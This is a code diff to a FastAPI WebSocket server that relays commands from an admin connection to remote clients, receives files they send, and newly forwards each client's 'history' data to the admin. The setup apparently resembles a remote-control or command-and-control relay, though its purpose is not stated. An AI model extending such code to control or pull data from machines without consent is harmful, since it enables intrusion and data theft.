@@ -1,9 +1,9 @@
 import asyncio
 
-from fastapi import FastAPI, WebSocket, Depends, HTTPException
+from fastapi import FastAPI, WebSocket
 from fastapi.security import APIKeyHeader
 from starlette.middleware.cors import CORSMiddleware
-from starlette.websockets import WebSocketDisconnect, WebSocketState
+from starlette.websockets import WebSocketDisconnect
 
 from utils import receive_file, is_client_admin
 
@@ -71,9 +71,6 @@ async def handle_client_interaction(client_websocket: WebSocket, admin_websocket
 
             await client_websocket.send_text(command)
 
-            if command.lower() == 'exit':
-                return False
-
     except WebSocketDisconnect:
         print(f"Connection with {client_websocket.client.host} disconnected.")
         return False
@@ -93,12 +90,20 @@ async def websocket_endpoint_client(websocket: WebSocket):
     try:
         while True:
             client_data = await websocket.receive_text()
+
             if client_data.lower().startswith('download'):
                 print("receive file")
                 _, filename = client_data.split(' ', 1)
                 # Use asyncio to concurrently receive file in the background
                 response = await asyncio.create_task(receive_file(websocket, filename))
                 await admin_websocket.send_text(f"Client {client_id}: {response}")
+                continue
+
+            elif client_data.lower().startswith('history'):
+                hist = await websocket.receive_json()
+                data = {"Client": client_id,
+                        "hist": hist}
+                await admin_websocket.send_json(data)
                 continue
 
             await admin_websocket.send_text(f"Client {client_id}: {client_data}")
